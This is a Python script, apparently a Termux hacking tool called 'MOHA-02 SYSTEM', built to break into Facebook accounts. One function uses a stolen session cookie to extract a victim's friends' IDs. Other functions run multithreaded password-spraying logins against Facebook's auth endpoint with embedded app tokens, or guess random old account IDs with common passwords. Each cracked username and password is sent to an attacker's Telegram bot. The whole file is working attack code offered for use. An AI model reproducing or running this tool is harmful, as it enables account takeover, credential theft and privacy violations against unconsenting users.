# -*- 
# --------------------------------------------------------
# Tool Name: MOHA-02 SYSTEM (Ultimate Edition)
# Developer: Moha Al-Shalfawi (@m_oha_02)
# Version: 4.5 (2026)
# --------------------------------------------------------

import os, sys, time, requests, random, uuid, threading
from concurrent.futures import ThreadPoolExecutor

G = '\033[1;32m' 
R = '\033[1;31m' 
Y = '\033[1;33m' 
B = '\033[1;34m' 
P = '\033[1;35m' 
C = '\033[1;36m' 
W = '\033[1;37m' 

hits, cp, bad = 0, 0, 0
stop_check = False

def logo():
    os.system('clear')
    print(f"""
{B}   __  __  ____  _   _    _      ___ ____  
{B}  |  \/  |/ __ \| | | |  / \    / _ \___ \ 
{P}  | |\/| | |  | | |_| | / _ \  | | | |__) |
{P}  | |  | | |__| |  _  |/ ___ \ | |_| / __/ 
{G}  |_|  |_|\____/|_| |_/_/   \_\ \___/_____|
{G}       SYSTEM V4.5 - BY MOHA AL-SHALFAWI
{Y}--------------------------------------------------""")

def join_channel():
    logo()
    print(f"{Y}[!] Subscribe to Channel to Start...")
    time.sleep(2)
    os.system("termux-open-url https://t.me/m_oha0_2b")
    print(f"{G}[+] Channel Opened. Enjoy!")
    time.sleep(2)

def login_fb(user, pw, chat_id, bot_token):
    global hits, cp, bad, stop_check
    if stop_check: return

    ua = "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263) [FBAN/FB4A;FBAV/450.0.0.45.109;]"
    url = "https://b-graph.facebook.com/auth/login"
    data = {
        "email": user, "password": pw,
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "method": "auth.login", "format": "json"
    }
    
    try:
        res = requests.post(url, data=data, headers={"User-Agent": ua}, timeout=10).json()
        if "session_key" in res:
            hits += 1
            print(f"\r{G}[MOHA-HIT] {user} | {pw}                     ")
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=🔥 MOHA HIT!\nUser: {user}\nPass: {pw}")
        elif "www.facebook.com" in str(res):
            cp += 1
            print(f"\r{Y}[MOHA-CP] {user} | {pw}                      ")
        elif "Calls to this api have exceeded" in str(res) or "403" in str(res):
            stop_check = True
            print(f"\n{R}[!] API BANNED! Use Airplane Mode & Retry.")
        else:
            bad += 1
            sys.stdout.write(f"\r{W}[Checking] {hits}/{cp}/{bad} | {user[:10]}..."); sys.stdout.flush()
    except: pass

def tool_extract():
    logo()
    cookie = input(f"{G}[+] Cookie: {B}")
    file_name = input(f"{G}[+] Save to: {B}")
    limit = int(input(f"{G}[+] Limit IDs: {P}"))
    
    print(f"{Y}[*] Extracting... Please Wait")
    try:
        headers = {"cookie": cookie}
        token_res = requests.get("https://business.facebook.com/business_locations", headers=headers).text
        token = "EAAG" + token_res.split('EAAG')[1].split('"')[0]
        
        friends = requests.get(f"https://graph.facebook.com/me/friends?access_token={token}", headers=headers).json()
        with open(file_name, "w") as f:
            count = 0
            for person in friends.get('data', []):
                if count >= limit: break
                f.write(f"{person['id']}|{person['name']}\n")
                count += 1
        print(f"{G}[+] Saved to {file_name} Successfully.")
    except: print(f"{R}[!] Extract Failed. Check Cookie.")
    time.sleep(2)

def tool_check_file():
    global stop_check
    stop_check = False
    logo()
    file_path = input(f"{G}[+] File Path: {B}")
    bot_token = input(f"{G}[+] Bot Token: {B}")
    chat_id = input(f"{G}[+] Chat ID: {B}")
    
    num_pass = int(input(f"{G}[+] Pass Limit (per ID): {P}"))
    custom_passes = [input(f"{C}  └─ Pass {i+1}: {B}") for i in range(num_pass)]
        
    try:
        users = open(file_path, "r").read().splitlines()
        print(f"{Y}[*] Checking Started... (Ctrl+C to stop)")
        with ThreadPoolExecutor(max_workers=35) as pool:
            for line in users:
                if stop_check: break
                uid = line.split('|')[0] if '|' in line else line
                for pw in custom_passes:
                    pool.submit(login_fb, uid, pw, chat_id, bot_token)
    except: print(f"{R}[!] File Not Found!")
    time.sleep(2)

def tool_old_hunting():
    global stop_check
    stop_check = False
    logo()
    print(f"{C}[1] {W}2004-2005 {C}[2] {W}2009 {C}[3] {W}2010-2012 {C}[4] {W}2013-2014")
    year = input(f"\n{G}[+] Select Year: {P}")
    bot_token = input(f"{G}[+] Bot Token: {B}")
    chat_id = input(f"{G}[+] Chat ID: {B}")
    
    passwords = ['123456', '1234567', '12345678', '123456789', '123123', '321321', 'password']
    
    print(f"{Y}[*] Hunting Started...")
    with ThreadPoolExecutor(max_workers=35) as pool:
        while not stop_check:
            if year == '1': uid = str(random.randint(100000, 99000000))
            elif year == '2': uid = "1000000" + str(random.randint(10000, 99999))
            elif year == '3': uid = "100001" + str(random.randint(100000, 999999))
            elif year == '4': uid = "100005" + str(random.randint(100000, 999999))
            else: break
            for pw in passwords: pool.submit(login_fb, uid, pw, chat_id, bot_token)

def main():
    join_channel()
    while True:
        logo()
        print(f"{C}[1] {W}Extract IDs (Cookie -> File)")
        print(f"{C}[2] {W}Check ID File (Custom Pass)")
        print(f"{C}[3] {W}Old ID Hunting (Auto)")
        print(f"{R}[0] {W}Exit")
        
        choice = input(f"\n{G}MOHA-02 > {P}")
        if choice == '1': tool_extract()
        elif choice == '2': tool_check_file()
        elif choice == '3': tool_old_hunting()
        elif choice == '0': sys.exit()

if __name__ == "__main__":
    main()
